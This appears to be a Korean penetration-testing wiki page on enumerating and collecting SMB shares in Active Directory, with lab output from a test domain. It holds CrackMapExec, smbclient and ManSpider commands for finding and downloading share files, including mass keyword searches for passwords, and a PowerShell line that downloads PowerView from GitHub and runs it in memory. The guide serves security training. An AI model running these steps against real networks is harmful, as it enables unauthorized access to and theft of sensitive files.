# SMB 쉐어 수집

SMB는 Server Message Block 프로토콜로서, 윈도우 액티브 디렉토리에서 파일과 프린터를 공유하는데 가장 많이 사용되는 프로토콜이다. 요새는 파일 공유 같은 경우는 웹 기반의 SaaS 로 많이 넘어갔지만, 아직도 많은 네트워크에서 쉐어를 이용한다.&#x20;

공격자들은 SMB 쉐어에 관련된 정보와 쉐어 안의 파일을 정보 수집을 통해 얻어낼 수 있다.&#x20;

### 도메인 유저 맥락&#x20;

도메인 유저 계정을 하나라도 장악한 공격자는 도메인 내 도메인 유저에게 공개되어 있는 쉐어를 탐색할 수 있다. 쉐어의 읽기/쓰기 권한이 잘못 설정되어 있는 경우, 공격자는 쉐어에 접근해 추가 공격에 용이한 파일을 얻을 수 있다. 혹은 민감한 정보가 담긴 파일이 있는 쉐어가 네트워크 안 모든 유저에게 공개되어 있는 경우도 많다.&#x20;

{% tabs %}
{% tab title="리눅스" %}
CrackMapExec을 이용해 찾아낼 수 있다.&#x20;

```
cme smb <target(s)> -u <user> -p <passwd> -d <domain> --shares 
```
{% endtab %}

{% tab title="윈도우" %}
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1');
find-domainshare -checkshareaccess
```
{% endtab %}
{% endtabs %}

예를 들어 다음과 같은 도메인 쉐어를 찾았다고 가정해보자.&#x20;

```
└─# cme smb 192.168.40.150 -u low -p 'Password123!' -d choi.local --shares
               
SMB         192.168.40.150  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:choi.local) (signing:True) (SMBv1:False)
SMB         192.168.40.150  445    DC01             [+] choi.local\low:Password123! 
SMB         192.168.40.150  445    DC01             [+] Enumerated shares
SMB         192.168.40.150  445    DC01             Share           Permissions     Remark
SMB         192.168.40.150  445    DC01             -----           -----------     ------
< ... >  
SMB         192.168.40.150  445    DC01             share           READ,WRITE      Share for deploying files from the DC       Logon server share 
```

도메인 컨트롤러의 "share" 라는 쉐어가 존재하는데, 일반적인 "low" 도메인 유저가 이에 읽기/쓰기 권한을 갖고 있다. smbclient 를 이용해 파일을 가져올 수 있다.&#x20;

```
└─# smbclient -U CHOI/low%'Password123!' \\\\192.168.40.150\\share

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  4 22:24:07 2022
  ..                                  D        0  Mon Jul  4 22:24:07 2022
  secret.txt                          A       18  Mon Jul  4 22:24:07 2022

                15644159 blocks of size 4096. 10228069 blocks available
smb: \> get secret.txt
getting file \secret.txt of size 18 as secret.txt (17.6 KiloBytes/sec) (average 17.6 KiloBytes/sec)
```

### Anonymous/Null Session Share&#x20;

SMB 쉐어의 권한이 잘못 설정되어 Anonymous 나 Null Session 으로 접근 가능한 쉐어들은 도메인 유저 맥락이 없어도, 아무런 계정 정보가 없어도 접근이 가능하다.&#x20;

```
cme smb <target(s)> -u '' -p ''  --shares
cme smb <target(s)> -u 'a' -p '' --shares 
enum4linux -a <target>
```



### 대량 SMB 정보 수집&#x20;

모의해킹을 진행하다보면 3만대 5만대의 호스트로부터 SMB 쉐어 파일을 가져와야할 때가 있다. 이렇듯 대량으로 SMB 파일을 다운받기 위해서는 ManSpider 라는 툴을 이용한다. Manspider 는 특정 파일 확장자, 파일 컨텐츠 등을 화이트리스트/블랙리스트 한 뒤, 파일을 다운 받는 툴이다. 몇천대, 몇만대 호스트를 상대로 실행해도 상당히 빠른 속도로 SMB 파일들을 수집한다.&#x20;

```
manspider.py --threads 128 <ip-ranges> -u <user> -p <pass> -c password passwd confidential
```

### 레퍼런스&#x20;

{% embed url="https://github.com/blacklanternsecurity/MANSPIDER" %}

